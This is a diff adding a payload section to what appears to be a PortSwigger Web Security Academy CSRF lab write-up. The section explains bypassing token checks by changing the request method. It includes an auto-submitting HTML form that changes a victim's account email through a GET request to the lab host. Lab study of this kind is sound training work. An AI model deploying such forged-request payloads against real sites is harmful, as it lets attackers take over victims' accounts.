@@ -102,3 +102,20 @@ in this lab as the ```view exploit``` uses our session only so we can use the to
 to ```deliver exploit to victim``` where port swigger runs on different session we should change the request method.
 
 ***for this kind of situation, in real life we cannot get the csrf token that easily so changing the request method is reliable.***
+
+**Payload:**
+```
+<form action="https://0a4100b603c0f2f9809e62e700c10073.web-security-academy.net/my-account/change-email"
+      method="GET">
+    <input type="hidden"
+           name="email"
+           value="avengers45@gmail.com">
+
+ 
+
+</form>
+
+<script>
+document.forms[0].submit();
+</script>
+```
